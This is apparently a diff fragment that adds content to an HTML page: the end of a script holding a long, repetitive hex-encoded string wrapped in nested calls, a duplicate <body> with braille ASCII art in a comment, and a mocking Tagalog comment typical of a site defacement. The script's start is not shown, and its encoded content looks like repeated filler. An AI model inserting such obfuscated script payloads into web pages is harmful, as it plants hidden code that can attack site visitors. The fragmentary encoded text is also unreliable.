6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7"))));
+    </script>
+</body>
+<body>
+    <!-- ⡐⢂⠒⢤⡲⣴⣀⠀⠘⢬⢻⡥⠐⢠⠒⠐⠂⢂⣒⣠⣒⡄⣃⠂⠆⡐⡀⢂⠰⠐⢢⠘⢤⢃⠆⠐⡄⢂⡐⢀⢂⡐⠠⢂⠐⡀⢂⠐⡀⢂⠐⡀⢂⠐⡀⠆⡐⢂⠒⡐⢢⢁⠒⡄⢂
+⢌⠢⡉⢖⡹⢺⣽⣂⠀⠨⠓⠀⣈⣤⣴⣶⣿⣿⠿⣭⠣⡍⡐⢈⠐⠀⠄⠁⢂⠉⠤⢉⠂⢎⠜⠀⠠⣁⠐⠂⠄⠠⡁⢂⠐⠠⢁⠂⡐⠄⢂⠐⠀⢂⠐⠰⠀⠅⠊⢀⠣⢌⠢⢘⠠
+⠢⡑⢌⠢⣍⢱⡻⡜⢀⣠⣶⣿⣯⣿⣿⣿⠿⣭⠻⡔⢣⠐⡁⠄⢈⠀⠂⢈⠀⠠⠀⠀⠈⠈⠘⠀⠃⠀⠊⠌⡐⠡⠐⠠⢈⠐⡀⢂⠐⡈⠄⠠⢁⠠⠈⠄⢁⡠⠎⢆⠱⢊⡔⢡⠂
+⠡⡍⢆⠣⢌⠠⢉⣴⢿⣯⣿⣿⣿⣿⣟⢾⡹⢆⡛⠬⣁⠂⠄⠐⠀⠠⠈⠀⡀⠂⢀⠁⠠⠀⠀⣠⢀⣀⣀⠤⡀⠁⠈⠡⠆⠠⠰⠄⠒⠀⡜⠀⢢⠀⠡⠂⡘⠤⡙⢄⠣⢌⠰⢃⡌
+⡑⠸⢌⠣⠌⢠⡾⣫⣿⣿⣿⣿⣿⣻⠽⣎⢳⠩⡌⠱⢀⠀⠀⠀⠀⠀⠀⠄⠀⠐⠀⡀⠂⢀⠀⡇⢸⣿⢣⠘⡱⢆⠄⠀⠀⡀⠀⠈⠀⢀⠀⠀⠀⠀⠀⠀⠅⠀⢐⠈⠒⡈⢆⠣⣒
+⣈⠱⡈⠅⣰⡿⣰⣿⣿⣿⣿⣿⡗⣯⢻⣌⢇⠳⡈⠅⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠂⠀⢀⠀⠀⢃⠸⢯⠁⠀⠀⠊⠆⠀⠀⠄⡁⠂⢀⠂⢀⠠⠀⠠⠀⠀⠀⠀⠀⠀⠔⠰⠆⠄⠀
+⠠⢁⠐⢰⡿⣰⣿⣿⣿⣿⣿⣿⣏⣟⢧⡚⣌⢣⠘⠠⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣧⣈⠀⠀⠐⠈⠀⢀⠈⠄⠠⢁⠠⠀⠂⠀⠄⠁⡀⠁⢈⠀⠄⠀⠀⠀⡀⠐⠂
+⠐⠂⢀⣿⢳⣿⣿⣿⣿⣿⣿⣿⡷⣺⢧⡛⣤⠃⢎⠁⠄⠀⠂⠀⠄⠂⠀⡀⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠠⠐⢈⠠⠈⠄⢁⠠⠀⠂⢁⠀⠂⠠⠀⢈⠀⠠⠀⠌⠀⠂⠀⠄⠀
+⠘⡀⢸⠇⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇⡟⣧⣘⠛⡄⠘⠀⠀⢀⠀⠀⠀⠄⠀⠀⠠⠀⠀⠀⠀⠀⠀⠀⠀⡘⠀⡀⠄⡀⠄⠃⡘⠀⡀⢃⠘⠀⡀⠘⠀⠠⠀⠀⠄⠠⢀⠘⠀⠃⡘⠀
+⠂⠀⣼⡄⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡽⣲⢅⡋⠄⠡⠀⣀⠀⠀⠀⠈⠀⠠⠈⢀⠠⠀⠐⠀⠀⠠⠀⢁⠠⠐⠠⠐⠀⠄⠡⠐⠠⠐⡀⠌⠐⡀⠌⠠⠁⠄⠁⠂⡐⠀⠂⢁⠠⢀⠀
+⢆⠁⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢵⡓⢎⠘⣠⡴⠛⡀⠀⠀⠀⠀⠁⠠⠐⠀⠀⡐⠀⠈⠀⡁⢀⠂⠐⡈⠐⢈⠐⡈⠄⡁⢂⠡⠐⡈⠐⠠⢀⠁⢂⠈⠄⡁⠠⢈⠐⠀⡀⠄⠀
+⢏⡆⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠏⢉⣤⠾⣫⠴⢋⣤⡶⠆⠀⠀⠀⠄⠀⠂⠁⠀⠠⠁⠠⢀⠀⠄⢁⠠⢈⠠⠐⢀⠂⡐⢀⠂⡁⠄⡁⠂⠄⡈⠄⢂⠐⡀⠡⠀⠂⠐⠀⡀⠀
+⠺⡄⢸⣿⣿⣿⣿⣿⣿⣿⣿⠟⣋⣴⡾⢛⣡⡾⢋⣴⣿⠟⠁⠀⠀⠀⠀⠀⠂⠀⠂⠁⠠⠀⢁⠠⠀⠌⢀⠐⠠⠐⡈⠄⢂⠐⡀⢂⠐⠠⢀⠁⢂⠐⡈⠄⡐⠠⢀⠡⠀⠁⡀⠀⠀
+⠑⠄⠈⣿⣿⣿⣿⣿⣿⣯⣴⣾⣿⣯⣶⡿⢋⣴⡿⡿⠃⠀⠀⠀⠀⠀⠀⠀⠂⠁⠀⠌⢀⠈⠠⠀⠌⠀⢂⠈⡐⠠⠐⡈⠄⢂⠐⠠⢈⠐⠠⠈⠄⢂⠐⠠⢀⠡⠀⠠⠈⠀⠀⠀⠀
+⡑⣚⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢛⣡⣾⣿⣿⠟⠀⠀⠀⠀⡀⠐⡈⠄⠡⠐⠈⠀⠄⠂⠠⠁⡈⠄⡈⠄⡐⠀⠡⠐⡀⠌⠠⢈⠐⠠⠈⠄⠡⢈⠀⢂⠁⠄⡐⠀⠁⠠⠀⠀⠀⠀
+⡘⠔⠂⣿⣿⣿⣿⣿⣿⣿⣭⣡⣶⣿⣿⣿⡿⠋⠀⠀⠀⣠⠂⡅⢃⡐⡈⠐⠠⠁⡈⢀⠂⢁⠐⡀⠄⠐⠠⢀⠁⢂⠡⠀⠌⡐⠠⠈⠄⠡⢈⠐⠠⢈⠀⠌⠀⠄⢈⠠⠀⠀⠀⠀⠀
+⠠⠈⠀⣿⣿⣿⣿⣿⣿⣿⣿⡘⣿⣿⣿⠏⠀⠀⠀⢠⠜⡤⠓⠌⠂⠐⠀⠀⠀⠀⠀⠂⡈⠄⠂⠄⢂⠁⠂⠄⡈⠄⠂⡁⠂⠄⡁⠂⠌⡐⠠⠈⠄⠂⡈⠄⠡⢈⠀⠀⠀⠀⠀⠀⠀
+⢂⠡⠀⣿⣿⣿⣿⣿⣿⣿⣿⡇⠻⠿⠏⠀⠀⡠⢘⠢⣉⠂⠁⢀⠒⡄⠀⠀⠀⠀⢀⢠⡑⣊⠱⡈⠤⢈⠐⠠⠐⡈⠐⠠⢁⠂⠄⡁⠂⠄⡁⠂⠌⠐⠠⢈⠐⠠⠈⠀⠀⠀⠀⠀⠀
+⢢⡑⠠⠉⠛⠿⣿⣿⣿⣿⡿⠟⡀⠠⡔⣎⠧⡑⡈⠐⠀⢀⠀⠀⠃⠐⠊⢁⠠⡰⢌⡒⡜⠤⠓⡌⢒⠠⠌⡠⠁⠄⡁⠂⠄⡈⠐⠠⢁⠂⠄⡁⠂⡁⠂⠄⡈⠄⠐⠀⠀⠀⠀⠀⠀
+⠣⠌⢁⣤⣄⡀⠀⠀⠁⠀⠀⠀⠀⠀⠙⣬⠳⡱⡀⠀⠐⠀⠄⠀⠐⠠⠘⣀⠣⠔⢣⠜⣌⢣⡙⡔⢣⠘⠤⢡⠘⠠⢀⠅⠂⢄⡁⠂⠄⡈⠐⡀⠡⢀⠁⠂⠄⡐⠀⠀⠀⠀⠀⠀⠀
+⠀⣠⣾⠇⣻⡁⢀⠐⠀⣤⣤⣀⠀⠀⠀⠀⡳⢡⠅⣂⠀⢈⠠⠀⢈⠀⡁⠄⠂⠍⢰⢊⠴⢣⠜⡰⢃⡍⢎⠤⢃⠅⢢⢈⠂⢄⠠⢁⠂⠄⠡⢀⠁⠂⠌⠐⡀⠠⠀⠀⠀⠀⠀⠀⠀
+⣠⣿⣷⣿⣿⣰⠸⣿⣅⡀⠋⠁⠄⣀⠐⢀⣴⣶⣦⣤⣤⣤⣄⠀⠀⠀⢀⠀⠀⠀⠀⠉⠚⠵⣊⠵⣃⠞⣌⢎⡱⢊⡔⢢⠉⡄⠂⠄⠌⠠⢁⠂⠌⡐⠈⡀⠀⠄⠀⠀⠀⠀⠀⠀⠀
+⣿⣿⣿⣿⣿⣿⣄⢻⣿⣿⣿⣶⣶⣦⣶⠟⣿⣿⣿⣿⣿⣿⠃⠀⠀⠈⠀⠄⠡⠀⠀⠀⡐⠤⡀⠤⢈⠌⡠⠌⠠⠃⠌⡄⢣⠐⡡⠈⠄⠃⠄⡈⠐⠠⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⣿⣿⣿⣿⣿⣿⣿⣆⢻⣿⣿⣿⣿⣿⡗⣾⣿⣿⣿⣿⠿⠃⠀⢀⠀⠠⠁⠂⠀⠀⡄⣒⠡⢂⠱⡈⠆⠘⠀⠡⠃⡜⠐⡨⠐⡂⠅⡘⠠⢁⠂⠄⡁⠂⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⣿⣿⣿⣿⣿⣿⣿⢠⣧⠙⣯⢻⣿⣿⠀⢻⣿⣿⣯⣵⠂⢠⡍⣦⠑⠀⠀⠀⣦⢱⢰⡌⢢⡅⢢⠁⡄⠀⠀⠀⠂⡌⠂⢡⠑⠈⡆⢡⡌⠐⠈⠐⠀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⣿⣿⣿⣿⣿⣿⣿⣼⣞⡠⠙⢿⣿⡿⠀⡈⠿⣿⠻⣥⡘⢦⡱⢂⢇⢡⡰⣍⢦⠓⡦⡑⠦⡘⠄⠂⠀⠀⠠⢁⠂⡐⢈⠰⢀⢃⠐⡂⠄⠃⠌⠀⠐⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⣿⣿⣿⣿⣿⣿⣿⣿⣳⠆⢀⠀⠈⠑⠲⢐⠲⠀⣤⣤⣉⣄⣉⠁⡎⢧⠳⣜⢮⡙⡖⣩⠂⠀⠀⠀⠀⠐⡀⢂⠐⡠⢁⠢⠈⡄⢊⠐⡈⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⣿⣿⣿⣿⣿⣿⣿⣿⣧⠀⡄⠀⠀⠀⠀⠀⠀⠺⡛⢿⣿⣿⣿⣆⠐⣶⣶⣤⣅⡙⢈⠑⠈⠀⠀⢀⠠⢁⠰⠠⣁⠒⡨⢄⠃⡔⠨⢀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⣿⣿⣿⣿⣿⣿⣿⡻⣞⢠⡅⠀⠀⠀⠀⠀⠀⠀⠈⠢⢍⠻⢿⣿⣦⣬⣿⠿⠛⠁⣀⣤⡴⠀⠀⢆⡘⢄⠣⡑⢄⠣⠔⡌⠒⡌⢂⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⣿⣿⣿⣿⣿⡟⣿⣝⡿⢸⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣷⣶⣂⠤⠤⣤⣴⣶⣿⡿⠋⠄⢠⡉⢖⠨⢆⡱⡘⡌⢆⢣⡘⢡⠘⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⣿⣿⣿⣿⣿⣽⣿⣮⣝⡣⢎⡐⠈⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⡿⣿⣿⠿⠛⠁⠀⡠⢎⡲⣩⢎⡕⢮⡔⢳⠸⡘⢦⠑⠢⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⣿⣿⣿⣿⣿⣿⣿⣷⢎⠷⡨⢐⠀⠐⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠁⠀⠤⣐⡪⢟⣵⣫⣗⣳⠾⣜⡳⢎⣧⠫⣕⠊⠑⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⢹⣿⣿⣿⣿⣿⣿⣻⣎⡳⢄⡁⢂⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠢⠤⠽⢯⡟⠿⠹⠙⣩⡴⠦⣄⠀⠀⠀⠀⢀⠠⠀⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ -->
+
+<!-- NAPAKAANGAS MO PRE! KUNIN MO NA YAN HAHAHAH KUPAL! -->
 </body>
 </html>
